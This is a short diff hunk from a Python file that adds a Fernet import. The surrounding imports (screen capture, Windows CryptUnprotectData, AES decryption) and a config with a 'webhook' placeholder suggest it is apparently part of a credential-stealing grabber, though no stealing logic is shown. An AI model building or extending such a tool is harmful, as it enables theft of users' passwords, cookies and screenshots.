@@ -8,6 +8,7 @@ from threading import Thread
 from PIL import ImageGrab
 from win32crypt import CryptUnprotectData
 from Crypto.Cipher import AES
+from cryptography.fernet import Fernet
 
 config = {
     'webhook': 'webhookhere',
